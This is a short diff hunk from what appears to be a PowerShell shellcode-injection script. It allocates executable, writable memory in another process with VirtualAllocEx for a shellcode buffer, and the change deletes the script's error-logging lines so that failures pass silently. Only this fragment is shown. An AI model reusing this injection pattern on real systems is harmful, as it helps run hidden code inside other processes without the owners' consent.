@@ -64,10 +64,6 @@ try {
     {
         $x=[Inject]::VirtualAllocEx($phandle,$zz,$Shellcode.Length*2,0x3000,0x40)
         if( $x.ToInt32() -ne $nul.ToInt32() ){ 
-        echo "[-] Failed using VirtualAllocEx"
-        $Lasterror = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-        echo "[-] LastError: $Lasterror"  
-        echo ""
         break 
         }
         $zz = [Int32]$zz + $Shellcode.Length
